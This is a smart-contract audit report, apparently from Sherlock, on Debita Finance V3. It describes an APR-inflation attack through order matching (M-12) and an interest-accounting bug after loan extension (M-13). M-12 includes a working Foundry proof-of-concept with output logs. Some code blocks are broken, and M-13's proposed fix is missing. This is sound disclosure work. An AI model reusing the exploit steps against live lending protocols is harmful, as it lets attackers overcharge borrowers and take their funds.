# Issue M-12: A borrower may pay more in interest that he has specified, if orders are matched by a malicious actor

**Severity:** medium
**Auditor:** Sherlock
**Protocol:** Debita Finance V3
**Keywords:** borrower, interest, APR, malicious actor, lend orders, matchOffersV3, lendAmountPerOrder, theft, collateral, liquidation, principal, Solidity, smart contract, attack, overpay, loss, funds, borrow order, lender, profit

---

# Issue M-12: A borrower may pay more in interest that he has specified, if orders are matched by a malicious actor

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-10-debita-judging/issues/480)  
Found by: 0x37, BengalCatBalu, dimulski, h4rs0n, newspacexyz


In the \u0060DebitaV3Aggregator.sol\u0060 contract, anybody can match borrow and lend orders by calling the \u0060matchOffersV3()\u0060 function. When borrowers create their borrow orders, they specify a maximum APR they are willing to pay. However, the \u0060matchOffersV3()\u0060 function allows the caller to specify an array of 29 different lend orders to be matched against each borrow offer. Another important parameter is the \u0060uint[] memory lendAmountPerOrder\u0060 which specifies the amount of principal tokens each lend order will provide. A malicious user can provide smaller amounts for a part of the \u0060lendAmountPerOrder\u0060 params, such that the borrower pays a higher APR on these amounts. The problem arises due to the fact that there are no minimum restrictions on the \u0060lendAmountPerOrder\u0060 (except it being bigger than 0), and the fact that Solidity rounds down on division.

\u0060\u0060\u0060solidity
uint updatedLastApr = (weightedAverageAPR[principleIndex] *
 → amountPerPrinciple[principleIndex]) / (amountPerPrinciple[principleIndex] +
 → lendAmountPerOrder[i]);
uint newWeightedAPR = (lendInfo.apr * lendAmountPerOrder[i]) /
 → amountPerPrinciple[principleIndex];
weightedAverageAPR[principleIndex] = newWeightedAPR + updatedLastApr;
\u0060\u0060\u0060

As we can see from the code snippet above, when the new \u0060WeightedAPR\u0060 is calculated if the APR specified by the lender of a lend order and the \u0060lendAmountPerOrder\u0060 product is less than the \u0060amountPerPrinciple[principleIndex]\u0060, 0 will be added to the \u0060weightedAverageAPR\u0060 for the borrow order. Now if the borrower has requested a lot of funds, paying a much bigger APR than the one he specified on 2%-3% on those funds results in a big loss for the borrower. Let\u0027s consider a simplified example of the PoC provided in the PoC section:

- A borrower creates a borrow offer for \u0060500_000e6USDC\u0060, with WETH as collateral, a \u00605% APR\u0060, and a ratio of \u00602_500e6USDC\u0060 for \u00601e18WETH\u0060, for a duration of \u0060150 days\u0060.
- There might be several lenders that have created orders that match the params of the borrow order, for simplicity consider there is one lender - Lender A that matches.
the params, and he has provided 495_000e6 USDC as available principal, or is left with such amount, after his lend order was matched with other borrow orders.

- Now the person who is matching the orders can either create a lend offer with higher APR, or find another lender who provides an accepted principal by the borrower, and accepts the offered collateral, but has a higher APR than the one specified by the borrower.
- We assume the user matching the orders creates a lend order with 10% APR, which is double the APR specified by the borrower (instead of only hurting the borrower by making him pay more interest, he is also going to profit).
- When matching the orders, the user will first provide a lend Amount Per Order of 200_000e6 + 1 from the lend order of Lender A, and then 28 more lend Amount Per Order 200e6 each from the lend order with 10% APR.
- Since the maxlength of the lend Amount Per Order is 29, for a bigger impact the malicious user will call the matchOffersV3() function once more, this time setting the first lend Amount Per Order to be 286_391e6 + 1, and then next amounts for the lend Amount Per Order will be 286e6.
- This results in two separate loan orders, however they are both for the same borrow order, in this way the borrower will have to pay 5% APR on 486_391e6 + 2 USDC, and 10% APR on 13_608e6 USDC. The borrower will have to pay double the APR he specified on ~2.72% of the funds he received (excluding the Debita protocol withheld fees, on which the borrower still pays interest). This results in the borrower paying 10_553_568_492 USDC instead of 10_273_952_054 USDC, which is a difference of 279_616_438 ~ 279e6 USDC, for the 150 day duration of the loan. Note that the above calculations are provided in the PoC below.

In conclusion this results in the borrower paying double the APR he specified on part of the principal he received. Keep in mind that the collateral is worth more than the principal, so the borrower is incentivized to repay his debt back, for some reason Debita has decided to not utilize liquidation if the nominal dollar value drops below the dollar nominal value of the principal, and rely only on loan duration for loan liquidations. Also in the above scenario the malicious actor profited by collecting a bigger interest rate on his assets.


In the matchOffersV3() function, there are no limitations on who can call the function, and on the provided parameters.


Borrower creates a big borrow order.
No response

No response

When borrow orders are big (there are numerous cases where people have taken out millions in loans, by providing crypto assets as collateral), malicious actors can match borrow and lend orders in such a way that the borrower pays much more APR than he has specified on a percentage of the principal he receives. This is a clear theft of funds, and in most cases the attacker can profit, if he matches the borrow order with a lend order of himself with a higher APR, and once the loan is repaid, collect the interest rate.

Gist After following the steps in the above mentioned gist add the following test to the AuditorTests.t.sol file:

\u0060\u0060\u0060solidity
function test_InflateAPR() public {
  vm.startPrank(alice);
  WETH.mint(alice, 200e18);
  WETH.approve(address(dboFactory), type(uint256).max);
  bool[] memory oraclesActivated = new bool[](1);
  oraclesActivated[0] = false;
  uint256[] memory LTVs = new uint256[](1);
  LTVs[0] = 0;
  address[] memory acceptedPrinciples = new address[](1);
  acceptedPrinciples[0] = address(USDC);
  address[] memory oraclesAddresses = new address[](1);
  oraclesAddresses[0] = address(0);
  uint256[] memory ratio = new uint256[](1);
  ratio[0] = 2_500e6;
  /// @notice alice wants 2_500e6 USDC for 1 WETH
  address aliceBorrowOrder = dboFactory.createBorrowOrder(
     oraclesActivated,
     LTVs,
     500, /// @notice set max interest rate to 5%
\u0060\u0060\u0060
150 days,
acceptedPrinciples,
address(WETH),
false,
0,
oraclesAddresses,
ratio,
address(0),
200e18
);
vm.stopPrank();
vm.startPrank(bob);
USDC.mint(bob, 495_000e6);
USDC.approve(address(dloFactory), type(uint256).max);
address[] memory acceptedCollaterals = new address[](1);
acceptedCollaterals[0] = address(WETH);
address bobLendOffer = dloFactory.createLendOrder(
   false,
   oraclesActivated,
   false,
   LTVs,
   500,
   151 days,
   10 days,
   acceptedCollaterals,
   address(USDC),
   oraclesAddresses,
   ratio,
   address(0),
   495_000e6
);
vm.stopPrank();
vm.startPrank(attacker);
USDC.mint(attacker, 15_000e6);
USDC.approve(address(dloFactory), type(uint256).max);
address attackerLendOffer = dloFactory.createLendOrder(
   false,
   oraclesActivated,
   false,
   LTVs,
   1000,
   151 days,
   10 days,
   acceptedCollaterals,
   address(USDC),
oraclesAddresses,
ratio,
address(0),
15_000e6
);
/// @notice match orders
address[] memory lendOrders = new address[](29);
lendOrders[0] = address(bobLendOffer);
for(uint256 i = 1; i < 29; i++) {
   lendOrders[i] = address(attackerLendOffer);
}
uint[] memory lendAmountPerOrder1 = new uint[](29);
lendAmountPerOrder1[0] = 200_000e6 + 1;
uint256 sumLendedLoanOrder1 = lendAmountPerOrder1[0];
for(uint256 i = 1; i < 29; i++) {
   lendAmountPerOrder1[i] = 200e6;
   sumLendedLoanOrder1 += lendAmountPerOrder1[i];
}
uint[] memory porcentageOfRatioPerLendOrder = new uint[](29);
for(uint256 i; i < 29; i++) {
   porcentageOfRatioPerLendOrder[i] = 10_000;
}
address[] memory principles = new address[](1);
principles[0] = address(USDC);
uint[] memory indexForPrinciple_BorrowOrder = new uint[](1);
indexForPrinciple_BorrowOrder[0] = 0;
uint[] memory indexForCollateral_LendOrder = new uint[](29);
for(uint256 i; i < 29; i++) {
   indexForCollateral_LendOrder[i] = 0;
}
uint[] memory indexPrinciple_LendOrder = new uint[](29);
for(uint256 i; i < 29; i++) {
   indexPrinciple_LendOrder[i] = 0;
}
address loanOrder1 = debitaV3Aggregator.matchOffersV3(
   lendOrders,
   lendAmountPerOrder1,
   porcentageOfRatioPerLendOrder,
   aliceBorrowOrder,
   principles,
   indexForPrinciple_BorrowOrder,
   indexForCollateral_LendOrder,
\u0060\u0060\u0060solidity
               uint[] memory lendAmountPerOrder2 = new uint[](29);
               lendAmountPerOrder2[0] = 286_391e6 + 1;
               uint256 sumLendedLoanOrder2 = lendAmountPerOrder2[0];
               for(uint256 i = 1; i < 29; i++) {
                   lendAmountPerOrder2[i] = 286e6;
                   sumLendedLoanOrder2 += lendAmountPerOrder2[i];
               }
               address loanOrder2 = debitaV3Aggregator.matchOffersV3(
                   lendOrders,
                   lendAmountPerOrder2,
                   porcentageOfRatioPerLendOrder,
                   aliceBorrowOrder,
                   principles,
                   indexForPrinciple_BorrowOrder,
                   indexForCollateral_LendOrder,
                   indexPrinciple_LendOrder
               );
               vm.stopPrank();
               vm.startPrank(alice);
               skip(150 days);
               uint256 aliceTotalBorrowed = sumLendedLoanOrder1 + sumLendedLoanOrder2;
               console2.log("Alice\u0027s total borrowed: ", aliceTotalBorrowed);
               uint256 taxedFee = aliceTotalBorrowed * 80 / 10_000;
               uint256 aliceUSDCBalance = USDC.balanceOf(alice);
               uint256 subFeeFromBalacne = aliceTotalBorrowed - taxedFee;
               uint256 aliceSupposedInterest = (aliceTotalBorrowed * 500) / 10000;
               uint256 duration = 150 days;
               uint256 aliceSupposedFinalPayment = (aliceSupposedInterest * duration) /
            31536000;
               console2.log("The amount alice should have paid after 150 days on 5%APR : ",
            aliceSupposedFinalPayment);
               uint256 alice10APR = (13_608e6 * 1_000) / 10_000;
               uint256 alice10APRFinalPayment = (alice10APR * duration) / 31536000;
               uint256 aliceNormalAPR = ((lendAmountPerOrder1[0] + lendAmountPerOrder2[0]) *
            500) / 10_000;
               uint256 aliceNormalAPRFinalPayment = (aliceNormalAPR * duration) / 31536000;
               uint256 aliceActualFinalInterestPayment = alice10APRFinalPayment +
            aliceNormalAPRFinalPayment;
               console2.log("Alice\u0027s actual final interest payment: ",
            aliceActualFinalInterestPayment);
\u0060\u0060\u0060
\u0060\u0060\u0060javascript
console2.log("Alice\u0027s overpays with: ", aliceActualFinalInterestPayment - aliceSupposedFinalPayment);
USDC.mint(alice, 50_000e6);
USDC.approve(address(loanOrder1), type(uint256).max);
USDC.approve(address(loanOrder2), type(uint256).max);
uint[] memory indexes = new uint[](29);
for(uint256 i; i < 29; i++) {
     indexes[i] = i;
}
uint256 aliceUSDCBalanceBeforeRepaying = USDC.balanceOf(alice);
DebitaV3Loan(loanOrder1).payDebt(indexes);
DebitaV3Loan(loanOrder2).payDebt(indexes);
uint256 aliceUSDCBalanceAfterRepaying = USDC.balanceOf(alice);
uint256 aliceTotalPaidAmount = aliceUSDCBalanceBeforeRepaying - aliceUSDCBalanceAfterRepaying;
console2.log("Alice\u0027s total paid amount: ", aliceTotalPaidAmount);
vm.stopPrank();
\u0060\u0060\u0060

Alice\u0027s total borrowed: 499999000002  
The amount alice should have paid after 150 days on 5APR: 10273952054  
Alice\u0027s actual final interest payment: 10553568492  
Alice\u0027s overpays with: 279616438  
Alice\u0027s total paid amount: 510552568474  

As can be seen from the logs above, and as explained in the example in the summary section, alice will overpay ~279e6 USDC, this attack can be performed on multiple borrowers. ((10553568492 - 10273952054) / 10273952054) * 100 = 2.72%. The borrower overpays by more than 1% and more than $10, which I believe satisfies the requirement for a high severity.

To run the test use: \u0060forge test -vvv --mt test_InflateAPR\u0060

No response

sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
[https://github.com/DebitaFinance/Debita-V3-Contracts/commit/deaf6819f98d9d8f5ead178cd21ed80921d5f340](https://github.com/DebitaFinance/Debita-V3-Contracts/commit/deaf6819f98d9d8f5ead178cd21ed80921d5f340)
## IssueM-13: Interest paid for non-perpetual loan during loan extension is lost when the borrower repays debt

Source: [GitHub Issue #483](https://github.com/sherlock-audit/2024-10-debita-judging/issues/483)

Found by: 0x37, Audinarey, ExtraCaterpillar, KaplanLabs, dimulski, newspacexyz, robertodf, t.aksoy


When a borrower calls \u0060extendLoan()\u0060 to extend a loan to the max deadline, interest is accrued to the lender up until the time the loan is extended and the lender\u0027s \u0060interestPaid\u0060 is updated as well for accounting purposes when calculating the interest with \u0060calculateInterestToPay()\u0060.


- [DebitaV3Loan.sol - Line 655-65](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaV3Loan.sol#L655-L65)
- [DebitaV3Loan.sol - Line 237C1-241C14](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaV3Loan.sol#L237C1-L241C14)

As shown below, interest is accrued and \u0060interestPaid\u0060 is also accrued correctly.

\u0060\u0060\u0060solidity
File: DebitaV3Loan.sol
655:                  } else {
656:      @>              loanData._acceptedOffers[i].interestToClaim +=
657:                          interestOfUsedTime -
658:                          interestToPayToDebita;
659:                  }
660:                  loanData._acceptedOffers[i].interestPaid += interestOfUsedTime;
\u0060\u0060\u0060

The problem is that when a borrower extends a loan and later repays the loan at the end of the max deadline that the loan was extended to, the unpaid interest is used to overwrite the previously accrued interest (as shown on L238 below), thus leading to a loss of interest to the borrower.

\u0060\u0060\u0060solidity
File: DebitaV3Loan.sol
186:     function payDebt(uint[] memory indexes) public nonReentrant {
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
function payDebt(uint[] memory indexes) public nonReentrant {
    IOwnerships ownershipContract = IOwnerships(s_OwnershipContract);
    ////SNIP   .......
    } else {
        loanData._acceptedOffers[index].interestToClaim +=
            interest -
            feeOnInterest;
}
\u0060\u0060\u0060

No response

No response

No response

This leads to a loss of interest for the lender

No response

Modify the payDebt() function as shown below

sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
https://github.com/DebitaFinance/Debita-V3-Contracts/commit/c6047ca43070746cbf8adcab12784e583d1de5d5
